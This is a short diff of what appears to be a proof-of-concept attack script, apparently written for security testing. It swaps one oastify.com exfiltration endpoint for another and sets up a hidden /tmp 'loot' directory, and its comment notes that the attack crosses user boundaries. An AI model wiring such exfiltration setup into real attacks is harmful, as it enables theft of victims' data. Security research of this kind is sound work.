@@ -22,7 +22,7 @@
 #   This crosses user boundaries — attacker ≠ victim.
 # =====================================================================
 
-EXFIL="https://lujn8ph5btmwinkhai9o15ij6ac10uoj.oastify.com"
+EXFIL="https://phadlhr1tcqybwgxabicvtwmzd54tuhj.oastify.com"
 LOOT="/tmp/.fbs-evidence"
 rm -rf "$LOOT" 2>/dev/null
 mkdir -p "$LOOT"
